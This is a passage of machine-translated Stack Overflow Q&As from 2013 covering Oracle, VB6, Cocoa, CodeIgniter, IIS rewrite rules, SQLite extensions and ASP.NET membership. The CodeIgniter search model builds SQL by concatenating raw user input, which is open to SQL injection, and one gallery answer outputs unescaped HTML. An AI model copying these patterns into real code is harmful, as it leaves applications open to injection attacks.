URL url = new URL("http://the.url.of.web.app:1234");
URLConnection urlConn = url.openConnection();
urlConn.connect();
// jump over if-clause for casts
HttpURLConnection httpConnection = (HttpURLConnection) connection;
int code = httpConnection.getResponseCode();
// do check on code; 200 is okay 
```

执行*mvn tomcat:redeploy*后，您可以在特殊配置文件中执行[安全测试。](http://maven.apache.org/surefire/maven-surefire-plugin/examples/inclusion-exclusion.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-12T09:44:21.970

您可以使用 jUnit + [HTMLUnit 之](http://htmlunit.sourceforge.net/)类的东西并从 Maven 运行这些测试。不确定您是否可以在部署后自动运行它，因为部署需要一些时间，而且 Maven 不知道应用程序何时准备就绪。

您可以让 Maven 使用 Cargo 运行本地 Tomcat 服务器并针对它运行这些单元测试。我知道那些不是真正的单元测试，但你可以使用 jUnit 来实现这一点......

# sql - Oracle对字符串字段的空检查

> ID：15357630
> 
> 赞同：2
> 
> 时间：2013-03-12T09:34:52.777
> 
> 标签：sql, oracle

在下面的示例中，为什么在 oracle 11g 中除了“NAME1”之外都给出 null 作为结果。

如果我明确提到空间，它会占用空间，否则 null 不是空字符串。请帮助我澄清这一点。

在 NAME2 中，我指定了空白空间，但它仍然给出了 null。

```
select 
NVL(NAME,' ') AS NAME1,
NVL(NAME,'') AS NAME2,
NVL(NAME,NULL) AS NAME3,
NAME AS NAME4 
from employee 
```

**输出 ：**

(空格),null,null,null

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-12T09:44:45.240

因为在 Oracle 中，零长度的 varchar 被视为 NULL。

在你的例子中

```
NVL(NAME, ' ') AS NAME1 will evaluate to either NAME or ' ' - empty string.
NVL(NAME, '') as NAME2 will evaluate to either NAME or a zero length string 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-12T10:59:30.470

因为 '' 等于 oracle 中的 null。例如这两个查询是相同的：

```
update  test set name=''  where id = 15
update  test set name=null   where id = 15 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-12T09:43:40.093

原因是在 Oracle 中，一个空字符串等价于`NULL`.

您可以通过执行以下查询看到这是真的

```
SELECT 'x' FROM DUAL WHERE '' IS NULL 
```

这应该返回一行，这意味着条件`'' IS NULL`是`true`。

# vba - vb6 和 msflexgrid，如何计算剪贴板文本中的列和行

> ID：15357640
> 
> 赞同：0
> 
> 时间：2013-03-12T09:35:19.487
> 
> 标签：vba, vb6, clipboard, msflexgrid

回到 vb6 和 msflexgrid，将文本粘贴到此控件有一个弱点。例如，如果用户想要在 msflexgrid 中粘贴一个 2*3 数组，他应该选择 2 行和 3 列来粘贴数据，否则只有一个单元格将填充 msflexgrid（插入 6 个单元格）。我发现如果我 colud 拆分剪贴板并计算它的行​​和列，这个问题应该解决（根据数组大小选择 msflexgrid 单元格）。我创建了“editpaste”SUB：

```
Private Sub EditPaste()
Dim ARRAYLINES As Variant ' array with the lines
Dim ARRAYCELLS As Variant ' array with the cells of 1 line to count the cols needed
Dim ARRAYLINESidx As Integer

   '§ put clipboard in a  textbox named "cliper"
   With cliper
      .Text = Clipboard.GetText
      If .Text = "" Then
         Exit Sub
      Else
         ARRAYLINES = Split(.Text, Chr(13)) 'i also used the Chr(10) vbnewline  andvbCRLF to count the lines
      End If
   End With
   '§ put textbox in grid
   If ARRAYLINES(0) = "" Then

      Exit Sub
   Else
      ARRAYCELLS = Split(ARRAYLINES(0), vbTab) 'to count the columns
  msgbox UBound(ARRAYLINES) & UBound(ARRAYCELLS)
   End If
   '§ clear array
   ReDim ARRAYLINES(0)
   ReDim ARRAYCELLS(0)

End Sub 
```

但我的问题是我有两种类型的文本数组（文本矩阵）。从 msflixgrid 到剪贴板的数组和从 Excell 到剪贴板的数组，我无法在该子目录中区分它们。下面是他们在 MSword 中的截图：

![在此处输入图像描述](../Images/d332c7af3d8355bf80fc2dcc6a295984.png)

图片中的箭头 n 是 TAb 字符，我对它们进行计数没有问题，并且所有文本数组的结果都相同。但是段落符号很棘手，我知道在第二个数组中它们是“vbnewline”，但是在第一个数组中我的代码找不到它们并假设我只有一行。您是否知道在计算这些列和行时获得相同结果的更好方法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T10:01:08.133

我使用以下代码查看剪贴板数据：

```
'1 form with
'  1 msflexgrid control
'  1 textbox control
'  2 command buttons

Option Explicit

Private Sub Command1_Click()
  Dim strText As String
  strText = Clipboard.GetText
  ShowAscii strText
End Sub

Private Sub Command2_Click()
  Clipboard.SetText MSFlexGrid1.Clip
End Sub

Private Sub Form_Load()
  Dim intRow As Integer, intCol As Integer
  With MSFlexGrid1
    For intRow = 0 To .Rows - 1
      For intCol = 0 To .Cols - 1
        .TextMatrix(intRow, intCol) = CStr(100 * intRow + intCol)
      Next intCol
    Next intRow
  End With 'MSFlexGrid1
End Sub

Private Sub ShowAscii(strText As String)
  Dim intChar As Integer
  Dim strShow As String
  strShow = ""
  For intChar = 1 To Len(strText)
    strShow = strShow & Right$("00" & Hex$(Asc(Mid$(strText, intChar, 1))), 2) & " "
  Next intChar
  Text1.Text = strShow
End Sub 
```

当我选择其中包含 200、201、300、301 的单元格并单击 command2，然后单击 command1 时，文本框显示：

```
32 30 30 09 32 30 31 0D 33 30 30 09 33 30 31 
```

当我将相同的数据放入excel并复制它，然后单击command1然后文本框显示：

```
32 30 30 09 32 30 31 0D 0A 33 30 30 09 33 30 31 0D 0A 
```

两者的区别在于 excel 使用 vbCrLF 来分隔行，而 MSFlexGrid 只使用 vbCr

我认为在处理之前从剪贴板数据中删除所有 vbLF 应该没问题：

```
strText = Replace(strText, vbLf, "") 
```

之后两种输入法都只使用 vbCR 作为行分隔符

# macos - NSDocument 的 NSSavePanel 的自定义附件视图

> ID：15357641
> 
> 赞同：5
> 
> 时间：2013-03-12T09:35:21.370
> 
> 标签：macos, cocoa, nsdocument, nssavepanel

`NSDocument`考虑支持两种文档类型（例如 BMP 和 JPEG）的 Cocoa 。虽然一种类型没有保存选项（例如 BMP），但另一种类型有（例如 JPEG 的压缩级别）。

你如何实现这一点？

我知道您应该覆盖`prepareSavePanel:`并设置给定的附件视图`NSSavePanel`。但是，这样做会用文档类型弹出窗口替换默认的附件视图。

如果使用自定义附件视图，是否需要重新创建文档类型弹出窗口？

如果是，如何将所选文档类型和附加保存选项传递给`NSDocument`写入方法？

如果不是，我如何才能仅在选择了相应的文档（例如 JPEG）类型时才显示其他保存选项（例如压缩级别）？中是否有用于更改文档类型的委托方法`NSSavePanel`？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T15:10:50.853

我很确定是的，如果你想要这样的自定义附件视图，你必须提供整个东西。真可惜——但提交雷达并没有什么坏处！

可以提供您自己的附件视图`-prepareSavePanel:`，然后覆盖`-fileTypeFromLastRunSavePanel`以返回所选类型。但是`NSDocument`，令人讨厌的是， 的文档没有承诺它会尊重这一点。试试看！

如果这不起作用，看起来您需要提供自己的`-runModalSavePanelForSaveOperation:delegate:didSaveSelector:contextInfo:`. 按照 Apple 对方法的描述：

> 此方法的默认实现首先确保使用 Cocoa Bindings 的 NSEditorRegistration 非正式协议注册的任何编辑器已提交其更改，然后创建一个保存面板，如果有多个文件类型，则添加一个标准的“文件格式”附件视图用户进行选择，[self shouldRunSavePanelWithAccessoryView] 返回 YES，设置面板的各种属性，调用 [self prepareSavePanel:theSavePanel] 提供自定义机会，然后呈现面板。如果用户确定，则调用面板 -saveToURL:ofType:forSaveOperation:delegate:didSaveSelector:contextInfo:。

请注意的文档`-writableTypesForSaveOperation:`：

> 您可以在创建自定义保存面板附件视图时调用此方法，以轻松呈现与 NSDocument 在其标准文件格式弹出菜单中相同的类型集。

# php - 如何在脸书的群墙发帖

> ID：15357642
> 
> 赞同：0
> 
> 时间：2013-03-12T09:35:22.677
> 
> 标签：php, facebook, facebook-graph-api

我想在群墙上发帖。我有“user_groups”和“publish_stream”的权限。还有access_token。

这是我的代码：

```
 try{
            $statusUpdate = $this->facebook->api('/'.$group_id.'/feed', 'post',
                 array(
                'name' => stripslashes($productname),
                //'caption'=>$caption,
                'message' => $message,
                'description' => $description,
                'picture' => $picture,
                'link'=>$link));

                    $postid =  $statusUpdate['id']; // return id

            } catch (Exception $e){
                        $postid = 0;
                    }
                    return $postid; // return id
    } 
```

当我运行这段代码时，我得到一个返回 id，它是页面 id。但我的群组墙上没有任何帖子。如何解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T10:07:36.627

此代码适用于我发布到 Facebook 页面。

1.  获取 FB 页面访问令牌 ($value['access_token']) 及其页面 id ($value['id'])
2.  填充 $params 数组
3.  使用 FB API 发布您的消息 3.

这是一个片段

```
foreach ($pages as $key => $value) {
   $params = array(
      'access_token' => $value['access_token'],
       'message' => $message
    );
    // ask facebook api to post the message to the selected page
    $facebook->api()->api( "/" . $value['id'] . "/feed", 'POST', $params );
} 
```

# sqlite - Sync Framework 和 SQlite 入门

> ID：15357646
> 
> 赞同：1
> 
> 时间：2013-03-12T09:35:38.430
> 
> 标签：sqlite, sync, microsoft-sync-framework

我是 Microsoft Sync Framework 的新手，正在尝试将 SQlite 数据库与 Sql Server 同步，有什么好的链接吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T12:24:31.767

Sqlite 没有开箱即用的同步提供程序，因此您必须自己编写。

或者您可以查看以下链接：

[在 WinRT 上与 SQLite 同步](http://blogs.msdn.com/b/mim/archive/2013/02/19/synchronization-with-sqlite-on-winrt.aspx)

[使用同步框架工具包同步 WINRT/SQLITE](http://jtabadero.wordpress.com/2013/01/09/synchronizing-winrtsqlite-using-sync-framework-toolkit/)

即使您没有构建 WinRT 应用程序，您也可以修改代码以在普通桌面模式非 WinRT 类型的应用程序中工作。

# heroku - 如何在heroku中设置捆绑器版本？

> ID：15357649
> 
> 赞同：5
> 
> 时间：2013-03-12T09:35:50.233
> 
> 标签：heroku, bundler

我需要在我的 gemfile 中指定 ruby​​ 版本，但我在 heroku 中的应用程序使用的是旧的捆绑器版本 1.0.7。

如果我`gem 'bundler', '1.3.2'`在我的 gemfile 中包含它，当我推送到 heroku 时它会失败。

```
Bundler could not find compatible versions for gem "bundler":
  In Gemfile:
    bundler (= 1.3.2)

  Current Bundler version:
    bundler (1.0.7)

Your version of Bundler is older than the one requested by the Gemfile.
Perhaps you need to update Bundler by running `gem install bundler`. 
```

我也尝试运行`heroku run "gem install bundler"`，它返回权限错误。

```
ERROR:  While executing gem ... (Gem::FilePermissionError)
    You don't have write permissions into the /usr/ruby1.9.2/lib/ruby/gems/1.9.1
 directory. 
```

如何在 heroku 中将 Bundler 版本设置为 1.3.2，以便我可以使用特定的 ruby​​ 版本？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-12T12:52:46.650

Heroku 将捆绑器作为堆栈的一部分进行管理。我猜你在 Bamboo 堆栈上，因为它使用 1.0.7 而 Cedar 使用的是 1.3.x 版本。

如果您使用的是 Bamboo，那么恐怕您别无选择，除了升级到 Cedar 之外，您将获得所有最新的好处。

# android - jfeinstein10/SlidingMenu 中使用的 crittercism_v3_0_3_sdkonly 是什么？

> ID：15357653
> 
> 赞同：5
> 
> 时间：2013-03-12T09:36:04.940
> 
> 标签：android, slidingmenu

jfeinstein10/SlidingMenu 中使用的 crittercism_v3_0_3_sdkonly 是什么？为什么这个库需要这个[https://github.com/jfeinstein10/SlidingMenu/tree/all-sides/example](https://github.com/jfeinstein10/SlidingMenu/tree/all-sides/example)项目？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T09:49:20.853

它可能不需要，只是由开发人员添加以帮助他们跟踪问题/错误 [https://www.crittercism.com/](https://www.crittercism.com/)

# winapi - MS Header Control - 如何仅更新（重绘）一项？

> ID：15357668
> 
> 赞同：0
> 
> 时间：2013-03-12T09:36:38.977
> 
> 标签：winapi, header, controls, refresh

我们正在使用来自 OS 公共控件库的标准 Header 控件。我们需要强制控件刷新仅与一个列标题（项）相关的区域。是否有特殊的 WinAPI 消息，或者我们可以使用的技巧？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-12T11:46:13.780

使用`HDM_GETITEMRECT`消息获取相关项目的矩形，然后使用`InvalidateRect`函数刷新它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-14T10:09:56.430

我们使用了以下技巧，因为列标题文本不直接存储在标题中（VB6 代码）：

```
Dim tHI As HD_ITEM
tHI.mask = HDI_TEXT
SendMessage m_hWnd, HDM_SETITEM, lCol, tHI 
```

事实上，我们并没有改变项目，但标题“认为”它发生了，所以实际上我们强制标题重新绘制项目。

注意：在这种情况下会发送 HDN_ITEMCHANGING，因此在使用此技巧时请忽略它。

# php - 在 Codeigniter 中使用 AJAX 显示图像列表

> ID：15357671
> 
> 赞同：2
> 
> 时间：2013-03-12T09:36:41.457
> 
> 标签：php, javascript, ajax, codeigniter

## 介绍：

我有一个存储文件名列表的数据库，这些文件名对应于 user_data 文件夹中的图像。

**我的 Codeigniter 目录结构如下所示：**

```
-application
-system
-assets
-user_data 
```

**和这样的数据库：**

```
CREATE TABLE `files` (
  `id` int NOT NULL AUTO_INCREMENT PRIMARY KEY,
  `filename` varchar(255) NOT NULL,
  `title` varchar(100) NOT NULL
); 
```

* * *

## 我想要达到的目标：

我想异步使用 Ajax 获取数据库中的所有文件名，然后使用文件名在一个小画廊中显示所有图像。重要的是，无需任何页面刷新即可完成此操作。

* * *

## 到目前为止我的代码：

**控制器**

```
class Create extends CI_Controller {

    public function __construct()
    {
        parent::__construct();
    }

    public function index()
    {
        $this->load->view('create', $data);
    }

} 
```

**看法**

```
<div id='gallery'> <!-- images will be displayed in here -->                

</div>

<!-- gallery should be updated when submit is clicked -->
<button id="update">Click to load images</button> 
```

我想要的是当用户单击更新时，数据库中表示的所有图像都显示在图库中。

我应该如何开始构建一个 JS 函数来处理这个问题？我想执行此操作并尊重 MVC 模式。

我是 Codeigniter 和 MVC 的新手，不确定如何正确构建模型和控制器来执行此操作。

任何帮助深表感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T09:48:53.757

试试这个`view page`：

但首先添加`jquery`您的`header file`或`your view`

**PHP**

```
<?php
class Model_name extends CI_Model {

    public function __construct()
    {
        parent::__construct();
    }
    /* Model code */
    function get_image_list(){
        $sql = sprintf("SELECT * FROM <table>");
        $query = $this->db->query($sql);
       return $query->result();
    }
 }

/*  Controller Code */

function update_gallery()
{
    $this->load->model('Model_name');
    $result = $this->Model_name->get_image_list();
    $str='';
    foreach($result as $row){
        $str.='<img src="'.$row['filepath'].'" alt="'.$row['title'].'" />';
    }
    echo $str;  
}

?> 
```

**JAVASCRIPT**

```
$(document).ready(function()
    $('#update').on('click',function(){
       $.ajax({
          url:'yourpagecontroller',
          type:'GET',
          success:function(data){
          // let data comes like: <img src="path.jpg" alt="Name of image" /><img .../>, etc
             $('#gallery').html(data);
          }
       })
    });
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-12T10:01:06.423

没有时间把它全部写出来，但这样的事情应该可以工作：

```
class Create extends CI_Controller {
        public function __construct()
    {
        parent::__construct();
        $this->load->model('files');
    }

    public function index()
    {
        $this->load->view('create', $data);
    }

    public function get_files()
    {
        echo json_encode($this->files->get_files());
    }
}

class Files extends CI_Model
{
    public function get_files()
    {
        return $this->db->query("SELECT * FROM files")->result_array();
    }
}

$(document).ready(function()
    $('#update').on('click',function(){
       $.ajax({
          url:'/create/get_files',
          type:'GET',
          success:function(result){
             var data = jQuery.parseJSON(result);

            // Loop through 'data' and append to the DOM

          }
       })
    });
}); 
```

# php - 使用codeigniter在搜索表单中搜索后无法从数据库中获取行数据

> ID：15357673
> 
> 赞同：0
> 
> 时间：2013-03-12T09:36:48.460
> 
> 标签：php, mysql, codeigniter

嘿伙计们，我是codeigniter的新手，我正在开发一个应用程序，其中我有数据库和数据库中的许多记录..我制作了一个搜索表单，在其中我制作了一个文本字段，用户可以在其中填写任何字段值和搜索记录。但这是一个小问题..当我在文本框中填写名称并单击搜索按钮时，视图中没有记录显示。. 请帮助我 。. 谢谢 ..

我的控制器是：

```
function search()
{
    $this->load->library('form_validation');
    $this->form_validation->set_rules('inputsearch', 'Search Your Text Here','required');
    if ($this->form_validation->run() == TRUE)
    {
        $this->load->helper('form');
        $this->load->helper('html');
        $search_this=$this->input->post('inputsearch');
        $this->load->model('mod_user');
        $searchmember=$this->mod_user->search_member($search_this);
        $data['searchmember'] = $searchmember;
        var_dump($searchmember);
        $this->load->view('view_home',$data);
        $this->load->view('view_homemember',$data);
    }
    else
    {
        redirect('ctl_home');
    }
} 
```

观点是：

```
<form class="userinfo" action="" method="post">
        <table border="1" cellpadding="2" cellspacing="0">
            <tr>
                <td width="5%;">&nbsp;</td>
                <td width="5%;">&nbsp;</td>
                <td width="15%;">Name</td>
                <td width="15%;">Moderator Name</td>
                <td width="20%;">KCC Branch</td>
                <td width="15%;">Father/Husband Name</td>
                <td width="15%;">Address</td>
                <td width="10%;">Date</td>
            </tr>
             <?php foreach ($rows as $row):?>
            <tr>
                <td><?php echo anchor("Ctl_Home/edit_member/" . $row->member_id, 'Edit'); ?></td>
                <td><a href="<?php echo site_url("ctl_dbcont/deleteinput/" . $row->member_id);?>" onclick="return confirm('Delete content?');">Delete</a></td>
                <td><?php echo $row->member_name;  ?></td>
                <td><?php echo $row->moderator_name;  ?></td>
                <td><?php echo $row->branch_name;  ?></td>
                <td><?php echo $row->father_name;  ?></td>
                <td><?php echo $row->address;  ?></td>
                <td><?php echo $row->date;  ?></td>
            </tr>
            <?php endforeach; ?>
        </table>
    </form> 
```

我的模型是：

```
function search_member($search_this)
{
    $query=$this->db->query("SELECT tbl_members.* , tbl_moderators.member_id AS moderator_id, tbl_moderators.member_name AS moderator_name, tbl_moderators.member_no AS moderator_no, tbl_branches.branch_name FROM tbl_members, tbl_members AS tbl_moderators, tbl_branches  WHERE tbl_members.moderator_id = tbl_moderators.member_id AND tbl_branches.branch_id = tbl_members.kcc_branch 
                                    AND  CONCAT(tbl_members.member_name, ' ', tbl_moderators.member_name, ' ',tbl_members.moderator_id, ' ', tbl_moderators.member_id, ' ',tbl_branches.branch_name, ' ',tbl_members.father_name, ' ',tbl_members.address, ' ',tbl_moderators.address, ' ',tbl_members.date, ' ',tbl_moderators.date)  like '%".$search_this."%'");
    if ($query->num_rows >= 0)
        {
            foreach($query->result_array() as $row)
            {
                $data[]=$row;
            }
            return $data;
        }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T09:40:52.287

你的循环应该是这样的

```
<?php foreach ($searchmember as $row):?>
    <tr>
        <td><?php echo anchor("Ctl_Home/edit_member/" . $row->member_id, 'Edit'); ?></td>
        <td><a href="<?php echo site_url("ctl_dbcont/deleteinput/" . $row->member_id);?>" onclick="return confirm('Delete content?');">Delete</a></td>
        <td><?php echo $row->member_name;  ?></td>
        <td><?php echo $row->moderator_name;  ?></td>
        <td><?php echo $row->branch_name;  ?></td>
        <td><?php echo $row->father_name;  ?></td>
        <td><?php echo $row->address;  ?></td>
        <td><?php echo $row->date;  ?></td>
    </tr>
<?php endforeach; ?> 
```

它是 $searchmember as $row 而不是 $rows as $row in foreach

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T09:41:34.433

如果 $data['searchmember'] 包含控制器中的值，您可以访问视图中的变量 $searchmember

# asp.net - IIS 重写不起作用（但重定向起作用）

> ID：15357674
> 
> 赞同：29
> 
> 时间：2013-03-12T09:36:48.933
> 
> 标签：asp.net, .net, iis, url-rewriting, url-rewrite-module

我试图使用*Rewrite Module 2.0*进行 URL 重写，但我没有运气让它工作。我正在尝试做的是将端口 80 对 Web 应用程序的所有调用重新写入 IIS 中托管的其他应用程序（或者可能在网络上的不同服务器上）。使用 IIS 提供的 GUI，我创建了以下规则：

```
<rewrite>
    <rules>
        <rule name="ReverseProxyInboundRule1" stopProcessing="true">
            <match url="site1/(.*)" />
            <action type="Rewrite" url="http://localhost:7001/{R:1}" />
        </rule>
    </rules>
</rewrite> 
```

安静简单，但不幸的是它不起作用。另一方面，当我将动作类型更改为 时`Redirect`，它工作正常。

可能是什么问题呢？

* * *

## 回答 #1

> 赞同：56
> 
> 时间：2015-11-24T10:29:41.360

我昨天遇到了同样的问题，我花了很长时间才弄清楚。

这里的关键是您的重写操作中有一个`http://`前缀；这使得这是一个需要由应用程序请求路由处理的特殊情况。第一步是确保安装了应用程序请求路由模块。[您可以在https://www.iis.net/downloads/microsoft/application-request-routing](https://www.iis.net/downloads/microsoft/application-request-routing)找到该模块。安装后，转到您的 IIS Web 服务器（从您的网站升级），然后打开应用程序请求路由缓存功能。从右侧的操作中选择`Server.Proxy.Settings`，并确保选中“启用代理”复选框。这允许将 URL 重写任务重新路由到应用程序请求路由，并且您的反向代理应该适用于外部请求。

这个想法来自 2009 年的这篇出色的博客文章：[http ://ruslany.net/2009/04/10-url-rewriting-tips-and-tricks/](http://ruslany.net/2009/04/10-url-rewriting-tips-and-tricks/)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-06-11T08:18:41.640

当我试图解决同样的问题时偶然发现了这篇旧帖子。

解决了！

使用 IIS 服务管理器中的重写 URL 功能，我创建了一个友好的 URL 规则。

这工作正常，当我查看 web.config 文件（www root）中的规则时，它显示了 1 个重定向规则和 1 个重写规则。

我编辑了这个以适应 1 场比赛。然后我只是复制了这段代码，为每个代码编辑了产品 ID。下面的例子：

```
<rule name="RedirectUserFriendlyURL1" stopProcessing="true">
    <match url="^product\.php$" />
    <conditions>
        <add input="{REQUEST_METHOD}" pattern="^POST$" negate="true" />
        <add input="{QUERY_STRING}" pattern="^id_product=\b35\b" />
    </conditions>
    <action type="Redirect" url="990mm-bohemia-cast-iron-electric-radiator" 
            appendQueryString="false" />
</rule> 
```

第一条规则`"product.php"`在 URL 中查找字符串`"id_product=35"`，然后重定向到`"990mm-bohemia-cast-iron-electric-radiator"`当前不存在的字符串。然后（见下文）

```
<rule name="RewriteUserFriendlyURL1" stopProcessing="true">
    <match url="^\b990mm-bohemia-cast-iron-electric-radiator\b" />
    <conditions>
        <add input="{REQUEST_FILENAME}" matchType="IsFile" negate="true" />
        <add input="{REQUEST_FILENAME}" matchType="IsDirectory" negate="true" />
    </conditions>
    <action type="Rewrite" url="product.php?id_product=35" />
</rule> 
```

此规则将`"product.php?id_product=35"`位重写为“990mm-bohemia-cast-iron-electric-radiator”，为重定向创建新位置。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2018-06-13T11:14:56.233

请确保 MVC 路由不会窃取您的请求。为防止这种情况发生，请忽略您尝试重写的路线：

```
RouteTable.Routes.Ignore("blog/{*pathInfo}"); 
```

灵感来自：[https ://sitecore.stackexchange.com/questions/3645/how-to-setup-a-reverse-proxy-with-sitecore](https://sitecore.stackexchange.com/questions/3645/how-to-setup-a-reverse-proxy-with-sitecore)

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2017-02-20T02:51:20.483

将 Rewrite URL 更改为 AbsolutePath 而不是放入 http://... 它应该是

```
<action type="Rewrite" url="{R:1}" /> 
```

它对我有用，但就我而言，我已被重写为固定网页。

# dynamics-crm-2011 - 工作流活动输入 InArgument 作为复选框

> ID：15357678
> 
> 赞同：1
> 
> 时间：2013-03-12T09:37:03.160
> 
> 标签：dynamics-crm-2011, crm

如何使用复选框显示所有营销列表？我的意思是，有了这段代码，

```
[Input("Team Name")]
[ReferenceTarget("team")]
public InArgument<EntityReference> TeamName { get; set; } 
```

我可以为团队查找输入。

我想将所有营销列表作为复选框并将联系人分配给一个或多个营销列表

这可能吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-12T10:21:58.190

默认情况下，我看不到任何方法可以做到这一点，但您可以使用 Web 资源、执行[html](http://msdn.microsoft.com/en-us/library/gg309536.aspx)或[Silverlight](http://msdn.microsoft.com/en-us/library/gg328358.aspx)应用程序来做到这一点。有了它，您可以不受限制地进行布局。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-12T11:31:24.333

不，您不能动态构建自定义工作流活动的参数。它们必须在编译时定义。

如果您希望用户从多个营销列表中进行选择，我只需将大量查找添加到营销列表中，然后用户可以根据需要填充它们。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-12T19:09:54.960

如果您创建一个 Web 资源并实施它以完全按照您的意愿进行操作，则可以实现。缺点是工作量很大。也许你可以从不同的角度来处理这个任务？

# c++ - 如何获取 BLOB 字段的一部分

> ID：15357682
> 
> 赞同：1
> 
> 时间：2013-03-12T09:37:19.257
> 
> 标签：c++, sqlite

我尝试在选择查询中获取 BLOB 字段的一部分，例如，
`subblobstr(BLOB_DATA,2,3)

代码如下，可以正确编译，但是不行：subblobstr(BLOB_DATA,2,3)还是和substr(BLOB_DATA,2,3)一样得到同样的结果。

希望有人能给我一些建议。先谢谢了。

```
#include <stdio.h>
#include <string.h>
#include "sqlite3ext.h"
 SQLITE_EXTENSION_INIT1

void subblobstr(sqlite3_context* ctx, int argc, sqlite3_value* argv[])
{
   const char* blobdata;
   int blob_len, start, slen;

   blobdata = (char*)sqlite3_value_blob(argv[0]);
   blob_len = sqlite3_value_bytes(argv[0]);
   start = sqlite3_value_int(argv[1]) - 1; 
   slen = sqlite3_value_int(argv[2]);
   sqlite3_result_blob(ctx, blobdata + start, slen, SQLITE_TRANSIENT);
}

int sqlite3SubBlobStrInit(sqlite3 *db){
  sqlite3_create_function(db, "subblobstr",3,SQLITE_ANY, 0, subblobstr, 0, 0);
  return 0;
}

int sqlite3_extension_init(
  sqlite3 *db, 
  char **pzErrMsg,
  const sqlite3_api_routines *pApi
){
  SQLITE_EXTENSION_INIT2(pApi)
  return sqlite3SubBlobStrInit(db);
} 
```

**[更新]**
表结构：

```
 cid         name        type
----------  ----------  ----------
  0           NAME         TEXT
  1           BLOB_DATA    BLOB 
```

BLOB_DATA 是一个 blob 类型字段，它包含一个 20MB 的字符串，我只想显示字符串的前几个字节，但是 substr 函数不起作用，因为它会在 BLOB_DATA 的第一个 NULL 字节处停止，所以我必须编写上面的函数来解决问题。

该表包含大量数据，但 substr(BLOB_DATA,1,10) 最多返回一个数字。 ![](../Images/35b104a88cde7c152ab4c55cd767978f.png)

来自 CL 的引用：
“表中的值是字符串，在这种情况下，您应该将它们转换为具有以下内容的 blob：”
`UPDATE MyTable SET blob_data = CAST(blob_data AS BLOB)`

运行上面的SQL语句后，sqlite shell会崩溃。（SQLite版本3.7.15.2 Win7）
，所以我使用SQLite Databasebut Browser先设置BLOB_DATA的类型（BLOB），然后substr（BLOB_DATA,1,10）仍然返回1位.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T13:39:47.560

`substr`与 blob 中的空字节一起工作得很好：

```
sqlite> CREATE TABLE MyTable(MyBlob);
sqlite> INSERT INTO MyTable VALUES (x'aabbccddeeff');
sqlite> INSERT INTO MyTable VALUES (x'221100221100');
sqlite> INSERT INTO MyTable VALUES (x'123456');
sqlite> INSERT INTO MyTable VALUES (x'ff1100223456');
sqlite> SELECT quote(MyBlob) FROM MyTable WHERE substr(MyBlob, 2, 3) = x'110022';
X'221100221100'
X'FF1100223456' 
```

你的问题是

*   表中的值是字符串，在这种情况下，您应该使用以下内容将它们转换为 blob：

    ```
    UPDATE MyTable SET blob_data = CAST(blob_data AS BLOB) 
    ```

*   或者您正在尝试显示返回的值，这可能会将其转换为字符串。使用`quote`or之类的函数`length`来检查返回的 blob 值是否正确。

# c# - Asp.net mvc 4 如何使用带有自定义字段的 WebSecurity.createUserAndAccount

> ID：15357686
> 
> 赞同：12
> 
> 时间：2013-03-12T09:37:35.780
> 
> 标签：c#, asp.net, asp.net-mvc-4

我在`UserProfile`table.like中创建自定义字段时遇到问题

```
public class UserProfile
    {
        [Key]
        [DatabaseGeneratedAttribute(DatabaseGeneratedOption.Identity)]
        public int UserId { get; set; }
        public int? AddressId { get; set; }
        public int? UserDetailId { get; set; }
        public string UserName { get; set; }

        public UserDetail UserDetail { get; set; }

    }

   public class RegisterModel
    {
        [Required]
        [Display(Name = "User name")]
        public string UserName { get; set; }

        [Required]
        [StringLength(100, ErrorMessage = "The {0} must be at least {2} characters long.", MinimumLength = 6)]
        [DataType(DataType.Password)]
        [Display(Name = "Password")]
        public string Password { get; set; }

        [DataType(DataType.Password)]
        [Display(Name = "Confirm password")]
        [Compare("Password", ErrorMessage = "The password and confirmation password do not match.")]
        public string ConfirmPassword { get; set; }

        public virtual UserDetail UserDetail { get; set; }

    }

     public class UserDetail 
     {
         public int Id{get;set;}
         public string FirstName{get;set;}    
         public string LastName{get;set;} 
     } 
```

我也加入`UserDetail`了`DbContext`课堂

```
 public DbSet<UserDetail> UserDetails{get;set;} 
```

问题是当我使用

```
Web  WebSecurity.CreateUserAndAccount(model.UserName, model.Password, 
                        new { UserDetail = new UserDetail ()
                        }, false); 
```

它总是会出现一些错误，例如：对象类型不存在映射...但是如果我定义一个简单的类型（例如`string`, `int`）而不是`UserDetail`，它可以正常工作。

任何人都可以帮我解决这个问题吗？非常感谢！！

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-03-13T22:32:13.413

我遇到了与此类似的问题，并通过以下方式使其工作：

将 UserDetail 和 UserProfile 结合到这一行：

```
public class UserProfile
{
    [Key]
    [DatabaseGeneratedAttribute(DatabaseGeneratedOption.Identity)]
    public int UserId { get; set; }
    public string UserName { get; set; }
    public string FirstName{get;set;}    
    public string LastName{get;set;}
} 
```

更新您的 [HttpPost] 注册

```
WebSecurity.CreateUserAndAccount(model.UserName, model.Password, 
   propertyValues: new { FirstName= model.FirstName, LastName = model.LastName}, false); 
```

不要忘记根据需要将新字段添加到您的 RegisterModel 中

```
